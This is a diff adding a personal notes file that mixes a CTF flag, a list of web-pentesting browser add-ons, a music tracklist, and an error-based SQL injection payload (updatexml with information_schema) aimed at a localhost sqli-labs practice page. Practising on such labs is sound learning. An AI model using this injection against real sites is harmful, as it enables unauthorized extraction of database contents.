@@ -1,0 +1,33 @@
+flag{DajiDali_JinwanChiji}
+Advanced Dock
+Cookies Manager+
+Exif Viewer
+firebug
+foxyproxy standard
+greasemonkey
+greasemonkey script
+groundspeed
+hackbar
+ie tab2（FF）
+poster
+refcontrol
+rightclickxss
+
+
+----------------------------------------------
+http://localhost/sqli/Less-5/
+?id=1' and 
+updatexml(1,concat(0x7e,(
+select group_concat(table_name) from information_schema.tables where table_schema=database()
+),0x7e),1) 
+--+
+----------------------------------------------
+
+0:00 - Vitality
+3:46 - Apropos
+9:11 - Epitomize
+13:26 - Luminescent
+17:39 - Vitality (VIP Edit)
+
+---------------------------------
+QR-Research 二维码
